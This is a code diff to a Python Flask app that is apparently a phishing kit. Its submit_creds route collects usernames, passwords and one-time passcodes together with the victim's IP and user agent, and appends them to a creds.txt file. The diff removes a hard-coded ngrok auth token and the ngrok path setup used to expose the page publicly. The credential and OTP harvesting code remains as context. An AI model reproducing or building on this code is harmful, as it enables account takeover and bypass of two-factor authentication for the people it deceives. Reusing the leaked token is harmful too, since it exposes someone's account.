@@ -7,13 +7,10 @@ import sys
 from datetime import datetime
 from flask import Flask, request, render_template, jsonify
 
-NGROK_AUTH_TOKEN = "2kvsTq98QwTBvXUKy72hcbgX9WR_5bAbjfCLZW5RijW1MzAZ8"
-# Check for ngrok in current directory first, then system PATH
-NGROK_PATH = "ngrok.exe" if os.path.exists("ngrok.exe") else "ngrok"
 FLASK_PORT = 5000
 
 app = Flask(__name__)
-os.makedirs("captures", exist_ok=True)  # Ensure captures folder exists
+os.makedirs("captures", exist_ok=True)
 
 def check_ngrok():
     try:
@@ -146,8 +143,6 @@ def submit_creds():
     otp = request.form.get("otp", "")
     user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
     user_agent = request.headers.get("User-Agent", "Unknown")
-
-    # Removed captcha validation completely
 
     print(f"Creds: {username}:{password} | OTP: {otp} | IP: {user_ip}")
     with open("creds.txt", "a", encoding="utf-8") as f:
